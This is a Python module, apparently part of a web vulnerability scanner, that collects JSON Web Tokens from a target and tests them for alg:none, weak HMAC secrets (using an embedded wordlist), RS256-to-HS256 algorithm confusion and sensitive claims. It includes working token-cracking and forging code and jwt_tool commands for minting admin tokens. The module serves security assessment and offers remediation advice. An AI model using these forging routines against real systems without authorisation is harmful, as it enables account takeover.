"""
jwt_attacks — discover and attack JSON Web Tokens.

Finds JWTs in cookies, the Authorization header echo, and page/JS source, then checks the
classic weaknesses a red team exploits to forge a valid token:

  * **alg:none** — the token is unsigned (an attacker can rewrite any claim).        → CRITICAL
  * **weak HMAC secret** — the HS256/384/512 signing key is a common/guessable string
    (cracked offline against a wordlist); with it, an attacker mints admin tokens.    → CRITICAL
  * **algorithm confusion (RS256→HS256)** — an asymmetric (RS*/ES*/PS*) token whose public key is
    publicly retrievable (JWKS / OpenID discovery): if the verifier trusts the token's own `alg`,
    an attacker re-signs it as HS256 with the public key as the HMAC secret.           → MEDIUM
  * **sensitive claims / no expiry** — roles, emails, missing `exp`.                  → INFO/LOW

Signature cracking is done locally (HMAC compute, no extra requests). The alg-confusion check is
detection-only by default; with ``--exploit`` it mints a forged HS256 token locally as a copy-paste
PoC (never replayed automatically). Tokens are redacted.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re

import httpx
from loguru import logger

from scanner.engine import Finding, Severity, ScanEngine

MODULE = "jwt_attacks"

# header.payload.signature — signature may be empty (alg:none).
_JWT_RE = re.compile(r"\beyJ[A-Za-z0-9_\-]{6,}\.eyJ[A-Za-z0-9_\-]{4,}\.[A-Za-z0-9_\-]{0,}")

# Common weak signing secrets to try (offline HMAC crack). Drawn from framework defaults,
# tutorials and common leaked wordlists — the kind of secret that ships unchanged to production.
_SECRET_WORDLIST = [
    "secret", "password", "123456", "jwt", "changeme", "key", "admin", "test", "secretkey",
    "your-256-bit-secret", "your_jwt_secret", "jwtsecret", "supersecret", "s3cr3t", "private",
    "token", "mysecret", "qwerty", "letmein", "default", "passw0rd", "jwt_secret", "shhhh",
    "secret123", "0", "1234567890", "HS256", "JWTSecretKey",
    # framework / tutorial defaults and other common values
    "secretKey", "my-secret", "my_secret", "mysecretkey", "supersecretkey", "oursecret",
    "secretpassword", "ThisIsASecret", "thisisasecret", "jwtKey", "jwt-key", "signing-key",
    "signingkey", "app_secret", "appsecret", "SECRET_KEY", "secret_key", "django-insecure",
    "flask", "express", "nodejs", "node", "root", "toor", "P@ssw0rd", "welcome", "welcome1",
    "iloveyou", "secret!", "Secret1", "Password1", "pass", "pass123", "hello", "foobar",
    "aaaaaa", "abc123", "access", "refresh", "bearer", "api", "backend", "production",
]

_HASHES = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}

# Asymmetric algorithms whose tokens the server verifies with a PUBLIC key. If that public key is
# retrievable (JWKS / OpenID discovery) and the server naively trusts the token's own ``alg``
# header, an attacker can switch ``alg`` to HS256 and sign with the public key bytes as the HMAC
# secret — the classic RS256→HS256 algorithm-confusion forge (CVE-2016-5431 class).
_ASYM_ALGS = {"RS256", "RS384", "RS512", "PS256", "PS384", "PS512", "ES256", "ES384", "ES512"}

# Standard locations a public signing key (or a pointer to it) is published.
_JWKS_PATHS = ("/.well-known/jwks.json", "/jwks.json", "/.well-known/openid-configuration")

# Claim names that should never live in a JWT payload — JWTs are signed, NOT encrypted, so anyone
# holding the token can base64-decode and read these.
_SENSITIVE_CLAIM_KEYS = (
    "password", "passwd", "pwd", "secret", "api_key", "apikey", "api-key", "private_key",
    "privatekey", "ssn", "social_security", "credit_card", "creditcard", "card_number", "cardnumber",
    "cvv", "access_key", "aws_secret", "client_secret", "refresh_token", "session_secret",
)


def _b64url_decode(seg: str) -> bytes:
    pad = "=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg + pad)


def _redact(token: str) -> str:
    return f"{token[:12]}…{token[-6:]}" if len(token) > 24 else token


def _decode_part(seg: str) -> dict:
    try:
        return json.loads(_b64url_decode(seg))
    except Exception:  # noqa: BLE001
        return {}


# ---------------------------------------------------------------------------
# Token collection
# ---------------------------------------------------------------------------

def _collect_tokens(engine: ScanEngine) -> list[str]:
    blobs: list[str] = []
    try:
        resp = engine.get()
        blobs.append("; ".join(f"{k}={v}" for k, v in resp.cookies.items()))
        blobs.append(resp.text[:200_000])
    except httpx.HTTPError:
        pass
    if engine.cookies:
        blobs.append(engine.cookies)
    if engine.auth_token:
        blobs.append(engine.auth_token)
    try:
        blobs.extend(engine.get_crawl().pages.values())
    except Exception:  # noqa: BLE001
        pass

    tokens: list[str] = []
    seen: set[str] = set()
    for blob in blobs:
        for tok in _JWT_RE.findall(blob or ""):
            if tok not in seen:
                seen.add(tok)
                tokens.append(tok)
    return tokens


# ---------------------------------------------------------------------------
# Attacks
# ---------------------------------------------------------------------------

def _crack_hmac(token: str, alg: str) -> str | None:
    """Return the signing secret if it is in the wordlist, else None."""
    hashfn = _HASHES.get(alg.upper())
    if hashfn is None:
        return None
    try:
        header_b64, payload_b64, sig_b64 = token.split(".")
    except ValueError:
        return None
    signing_input = f"{header_b64}.{payload_b64}".encode()
    for secret in _SECRET_WORDLIST:
        digest = hmac.new(secret.encode(), signing_input, hashfn).digest()
        expected = base64.urlsafe_b64encode(digest).rstrip(b"=").decode()
        if hmac.compare_digest(expected, sig_b64):
            return secret
    return None


# ---------------------------------------------------------------------------
# Algorithm confusion (RS256 → HS256)
# ---------------------------------------------------------------------------

def _parse_jwks(text: str) -> list[dict]:
    """Extract RSA JWK entries from a JWKS document, or from an OpenID config's inline keys.

    Only the fields needed for the confusion check are kept; a non-JSON body yields nothing.
    """
    try:
        doc = json.loads(text)
    except (ValueError, TypeError):
        return []
    keys = doc.get("keys") if isinstance(doc, dict) else None
    if not isinstance(keys, list):
        return []
    return [k for k in keys if isinstance(k, dict) and k.get("kty") == "RSA"
            and k.get("n") and k.get("e")]


def _discover_public_key(engine: "ScanEngine") -> "tuple[str, dict] | None":
    """Return (source_path, RSA-JWK) for the first published RSA public key, or None.

    Tries the conventional JWKS paths directly; for the OpenID discovery document it follows a
    same-origin relative ``jwks_uri`` (cross-origin pointers are left to scope rules, not chased).
    """
    for path in _JWKS_PATHS:
        try:
            resp = engine.get(path)
        except httpx.HTTPError:
            continue
        if resp.status_code >= 400:
            continue
        text = resp.text or ""
        keys = _parse_jwks(text)
        if keys:
            return path, keys[0]
        # OpenID discovery: follow a same-origin jwks_uri one hop.
        if path.endswith("openid-configuration"):
            try:
                cfg = json.loads(text)
                jwks_uri = cfg.get("jwks_uri") if isinstance(cfg, dict) else None
            except (ValueError, TypeError):
                jwks_uri = None
            if isinstance(jwks_uri, str) and jwks_uri:
                rel = jwks_uri
                # Keep only the path component so the fetch stays same-origin via the engine.
                m = re.match(r"https?://[^/]+(/.*)$", jwks_uri)
                if m:
                    rel = m.group(1)
                try:
                    jr = engine.get(rel)
                    if jr.status_code < 400:
                        keys = _parse_jwks(jr.text or "")
                        if keys:
                            return rel, keys[0]
                except httpx.HTTPError:
                    pass
    return None


def _jwk_to_pem(jwk: dict) -> "bytes | None":
    """Rebuild the PEM-encoded RSA public key from a JWK's modulus/exponent (``n``/``e``)."""
    try:
        from cryptography.hazmat.primitives import serialization
        from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
        n = int.from_bytes(_b64url_decode(jwk["n"]), "big")
        e = int.from_bytes(_b64url_decode(jwk["e"]), "big")
        pub = RSAPublicNumbers(e, n).public_key()
        return pub.public_bytes(serialization.Encoding.PEM,
                                serialization.PublicFormat.SubjectPublicKeyInfo)
    except Exception as exc:  # noqa: BLE001 — any crypto hiccup just means "no PoC", never a crash
        logger.debug(f"jwt_attacks: cannot rebuild PEM from JWK: {exc}")
        return None


def _forge_hs256(payload: dict, pem: bytes) -> "str | None":
    """Mint an HS256 token over *payload* using *pem* as the HMAC secret (the confusion forge)."""
    try:
        def _seg(obj) -> str:
            raw = json.dumps(obj, separators=(",", ":")).encode()
            return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
        header_b64 = _seg({"alg": "HS256", "typ": "JWT"})
        payload_b64 = _seg(payload)
        signing_input = f"{header_b64}.{payload_b64}".encode()
        sig = hmac.new(pem, signing_input, hashlib.sha256).digest()
        sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
        return f"{header_b64}.{payload_b64}.{sig_b64}"
    except Exception as exc:  # noqa: BLE001
        logger.debug(f"jwt_attacks: HS256 forge failed: {exc}")
        return None


def _alg_confusion(token: str, header: dict, payload: dict,
                   engine: "ScanEngine", key: "tuple[str, dict] | None") -> list[Finding]:
    """Flag an RS256→HS256 confusion risk when an asymmetric JWT's public key is retrievable.

    Detection-only by default: having the public key means an attacker *could* forge a token IF the
    server trusts the token's ``alg`` header. With ``--exploit`` (authorised targets), a forged
    HS256 token is minted locally as a copy-paste PoC — it is never replayed automatically.
    """
    alg = str(header.get("alg", "")).upper()
    if alg not in _ASYM_ALGS or key is None:
        return []
    source, jwk = key
    evidence = [
        f"token uses asymmetric {alg}; server verifies it with a public key",
        f"RSA public key is publicly retrievable at {source}",
        "if the server passes the token to a single 'verify' call that trusts the token's own alg "
        "header, an attacker can resign it as HS256 using the public key bytes as the HMAC secret",
    ]
    raw: dict = {
        "token": _redact(token), "alg": alg, "jwks_source": source, "confidence": "medium",
        "attack": "T1606.001 Forge Web Credentials",
        "evidence": evidence,
        "exploitation": [
            {"step": 1, "description": "Download the server's public key (JWKS).",
             "command": f"curl -s <target>{source}"},
            {"step": 2, "description": "Forge an HS256 token signed with the public key as the secret.",
             "command": "jwt_tool <token> -X k -pk public.pem -I -pc role -pv admin"},
        ],
    }
    recommendation = ("Pin the expected algorithm server-side and verify asymmetric tokens with the "
                      "public key only — never let the token's own 'alg' header choose the "
                      "verification algorithm. Reject HS* on an RS*/ES* endpoint.")
    verified = False
    verification = ""

    if getattr(engine, "exploit", False):
        pem = _jwk_to_pem(jwk)
        if pem is not None:
            forged = _forge_hs256(payload, pem)
            if forged is not None:
                raw["forged_token"] = _redact(forged)
                raw["confidence"] = "high"
                evidence.append(
                    "PoC: a valid-looking HS256 token was minted locally using the published public "
                    f"key as the HMAC secret ({_redact(forged)}) — replay it against an authenticated "
                    "endpoint to confirm the server accepts the confusion forge")
                verification = ("forged an HS256 token with the published RSA public key as the HMAC "
                                "secret (local PoC; confirm by replay)")

    return [Finding(
        module=MODULE,
        title="JWT Algorithm-Confusion Risk (RS→HS) — Public Key Retrievable",
        description=(
            f"An asymmetric ({alg}) JWT was found and the server's RSA public key is publicly "
            f"retrievable ({source}). If the verifier trusts the token's own 'alg' header, an "
            "attacker can re-sign the token as HS256 using the public key as the HMAC secret and "
            "forge arbitrary valid tokens (algorithm confusion)."
        ),
        severity=Severity.MEDIUM,
        recommendation=recommendation,
        verified=verified, verification=verification,
        raw=raw,
    )]


def _analyse(token: str) -> list[Finding]:
    header = _decode_part(token.split(".")[0])
    payload = _decode_part(token.split(".")[1]) if token.count(".") >= 1 else {}
    alg = str(header.get("alg", "")).upper()
    findings: list[Finding] = []

    if alg == "NONE":
        findings.append(Finding(
            module=MODULE, title="JWT Accepts 'alg:none' — Unsigned Token",
            description=(
                f"A JWT using the 'none' algorithm was found ({_redact(token)}). Unsigned tokens "
                "let an attacker rewrite any claim (e.g. become admin) with no signature."
            ),
            severity=Severity.CRITICAL,
            recommendation="Reject the 'none' algorithm; pin the expected algorithm server-side.",
            raw={"token": _redact(token), "alg": "none", "claims": payload, "confidence": "high",
                 "attack": "T1606.001 Web Session Cookie / Forge Web Credentials",
                 "evidence": [f"decoded JWT header alg = 'none' (unsigned): {_redact(token)}",
                              "any claim can be edited and the signature dropped — the token still validates"],
                 "exploitation": [
                     {"step": 1, "description": "Forge an unsigned token to bypass signature checks.",
                      "command": "jwt_tool <token> -X a"},
                     {"step": 2, "description": "Tamper a claim (e.g. become admin) and re-issue it.",
                      "command": "jwt_tool <token> -X a -I -pc role -pv admin"}]},
        ))

    if alg in _HASHES:
        secret = _crack_hmac(token, alg)
        if secret is not None:
            findings.append(Finding(
                module=MODULE, title=f"JWT Signed with a Weak Secret ('{secret}')",
                description=(
                    f"The {alg} signing secret of a JWT is the guessable value '{secret}'. "
                    "An attacker who knows it can forge arbitrary valid tokens (full account "
                    "takeover / privilege escalation)."
                ),
                severity=Severity.CRITICAL,
                recommendation=("Use a long, random, high-entropy signing key stored as a secret; "
                                "rotate the current key immediately."),
                raw={"token": _redact(token), "alg": alg, "secret": secret, "claims": payload,
                     "confidence": "high", "attack": "T1552 Unsecured Credentials",
                     "evidence": [f"{alg} signature cracked offline — signing secret = '{secret}'",
                                  f"HMAC-{alg} of header.payload with '{secret}' matches the token signature"],
                     "exploitation": [
                         {"step": 1, "description": f"Mint an admin token signed with the cracked secret '{secret}'.",
                          "command": f'jwt_tool <token> -S {alg.lower()} -p "{secret}" -I -pc role -pv admin'},
                         {"step": 2, "description": "Or brute-force/confirm the secret with a wordlist.",
                          "command": "jwt_tool <token> -C -d rockyou.txt"}]},
            ))

    # Sensitive data baked into the (unencrypted) payload — readable by anyone holding the token.
    leaked = sorted({str(k) for k in payload if str(k).lower() in _SENSITIVE_CLAIM_KEYS})
    if leaked:
        findings.append(Finding(
            module=MODULE, title="JWT Leaks Sensitive Data in Claims",
            description=(
                f"A JWT payload ({_redact(token)}) contains sensitive claim(s): {', '.join(leaked)}. "
                "JWTs are signed but NOT encrypted — anyone who holds the token can base64-decode and "
                "read these values."
            ),
            severity=Severity.MEDIUM,
            recommendation=("Never put secrets (passwords, API keys, card/SSN data) in a JWT payload; "
                            "keep them server-side and reference them by an opaque id."),
            raw={"token": _redact(token), "alg": alg, "sensitive_claims": leaked, "confidence": "high",
                 "attack": "T1552 Unsecured Credentials",
                 "evidence": [f"JWT payload exposes sensitive claim(s): {', '.join(leaked)}",
                              "payload is base64url, not encrypted — readable by any token holder"]},
        ))

    # Informational: claims & expiry posture.
    notes = []
    if any(k in payload for k in ("role", "roles", "admin", "is_admin", "scope", "permissions")):
        notes.append("carries authorization claims")
    if "exp" not in payload:
        notes.append("has no expiry (exp)")
    if notes and not findings:  # only if not already escalated
        findings.append(Finding(
            module=MODULE, title="JWT Claims Exposed (client-readable)",
            description=(
                f"A JWT readable from the client ({_redact(token)}) " + " and ".join(notes)
                + ". JWT payloads are not encrypted — never store secrets in them."
            ),
            severity=Severity.LOW,
            recommendation="Minimise claims, set a short `exp`, and never trust client-held tokens.",
            raw={"token": _redact(token), "alg": alg, "claims": payload, "confidence": "medium",
                 "attack": "T1552 Unsecured Credentials"},
        ))
    return findings


def run(engine: ScanEngine) -> list[Finding]:
    tokens = _collect_tokens(engine)
    if not tokens:
        return []
    findings: list[Finding] = []
    # Only look up the server's public key if at least one token is asymmetric (avoids needless
    # requests), and do it once for the whole run.
    _pubkey: "tuple[str, dict] | None" = None
    _pubkey_looked_up = False

    def _public_key() -> "tuple[str, dict] | None":
        nonlocal _pubkey, _pubkey_looked_up
        if not _pubkey_looked_up:
            _pubkey_looked_up = True
            try:
                _pubkey = _discover_public_key(engine)
            except Exception as exc:  # noqa: BLE001
                logger.debug(f"jwt_attacks: public-key discovery failed: {exc}")
                _pubkey = None
        return _pubkey

    for tok in tokens[:20]:
        try:
            findings.extend(_analyse(tok))
            header = _decode_part(tok.split(".")[0])
            payload = _decode_part(tok.split(".")[1]) if tok.count(".") >= 1 else {}
            if str(header.get("alg", "")).upper() in _ASYM_ALGS:
                findings.extend(_alg_confusion(tok, header, payload, engine, _public_key()))
        except Exception as exc:  # noqa: BLE001
            logger.debug(f"jwt_attacks: token analysis failed: {exc}")
    _order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    findings.sort(key=lambda f: _order.get(f.severity.value, 9))
    logger.info(f"jwt_attacks: {len(tokens)} token(s), {len(findings)} finding(s)")
    return findings
